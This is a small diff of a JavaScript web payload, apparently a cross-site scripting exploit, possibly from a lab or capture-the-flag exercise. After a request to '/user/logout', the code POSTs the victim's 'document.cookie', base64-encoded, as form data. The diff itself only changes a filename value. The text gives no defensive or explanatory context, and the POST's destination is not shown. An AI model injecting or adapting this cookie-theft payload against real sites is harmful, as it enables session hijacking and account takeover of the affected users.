@@ -11,7 +11,7 @@ fetch("/user/logout").then(e=>{
   headers: {
     "Content-Type": "application/x-www-form-urlencoded",
   },
-  body: "filename=asdf&data="+btoa(document.cookie),
+  body: "filename=asdf2&data="+btoa(document.cookie),
 })
 })
 })
